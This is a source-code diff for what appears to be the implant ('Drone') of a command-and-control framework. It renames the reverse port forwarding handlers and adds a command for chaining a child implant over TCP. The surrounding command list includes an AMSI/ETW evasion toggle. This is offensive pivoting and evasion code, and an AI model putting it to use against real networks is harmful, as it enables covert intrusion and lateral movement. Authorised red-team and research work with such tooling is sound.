@@ -69,25 +69,29 @@ namespace Drone.Modules
                 new("amsi/etw", false),
                 new("true/false")
             }),
-            new Command("start-rportfwd", "Start a new reverse port forward", Start,
+            new Command("start-rportfwd", "Start a new reverse port forward", StartReversePortForward,
                 new List<Command.Argument>
                 {
                     new("bindPort", false),
                     new("forwardHost", false),
                     new("forwardPort", false),
                 }),
-            new Command("stop-rportfwd", "Stop a reverse port forward", Stop,
+            new Command("stop-rportfwd", "Stop a reverse port forward", StopReversePortForward,
                 new List<Command.Argument>
                 {
                     new("bindPort", false)
                 }),
             
-            new Command("list-rportfwds", "List all active reverse port forwards", List),
-            new Command("purge-rportfwd", "Purge all active reverse port forwards", Purge),
+            new Command("list-rportfwds", "List all active reverse port forwards", ListReversePortForwards),
+            new Command("purge-rportfwd", "Purge all active reverse port forwards", PurgeReversePortForwards),
             new Command("rportfwd-inbound", "", HandleInboundResponse, visible: false),
             new Command("link", "Link to an SMB Drone", LinkSmbDrone, new List<Command.Argument>
             {
                new("hostname", false) 
+            }),
+            new Command("connect", "Connect to a TCP Drone", ConnectTcpDrone, new List<Command.Argument>
+            {
+                new("hostname", false) 
             }),
             new Command("exit", "Exit this Drone", ExitDrone)
         };
@@ -194,7 +198,7 @@ namespace Drone.Modules
             Drone.SendResult(task.TaskGuid, $"{config} is {current}");
         }
         
-        private void Stop(DroneTask task, CancellationToken token)
+        private void StopReversePortForward(DroneTask task, CancellationToken token)
         {
             if (!int.TryParse(task.Arguments[0], out var bindPort))
             {
@@ -208,7 +212,7 @@ namespace Drone.Modules
             _forwards.Remove(rportfwd);
         }
 
-        private void Start(DroneTask task, CancellationToken token)
+        private void StartReversePortForward(DroneTask task, CancellationToken token)
         {
             if (!int.TryParse(task.Arguments[0], out var bindPort))
             {
@@ -240,13 +244,13 @@ namespace Drone.Modules
             }
         }
         
-        private void List(DroneTask task, CancellationToken token)
+        private void ListReversePortForwards(DroneTask task, CancellationToken token)
         {
             var list = _forwards.ToString();
             Drone.SendResult(task.TaskGuid, list);
         }
         
-        private void Purge(DroneTask task, CancellationToken token)
+        private void PurgeReversePortForwards(DroneTask task, CancellationToken token)
         {
             foreach (var forward in _forwards) forward.Stop();
             _forwards.Clear();
@@ -289,6 +293,14 @@ namespace Drone.Modules
         {
             var target = task.Arguments[0];
             var handler = new DefaultSmbHandler(target);
+            
+            Drone.AddChildDrone(handler);
+        }
+
+        private void ConnectTcpDrone(DroneTask task, CancellationToken token)
+        {
+            var target = task.Arguments[0];
+            var handler = new DefaultTcpHandler(target);
             
             Drone.AddChildDrone(handler);
         }
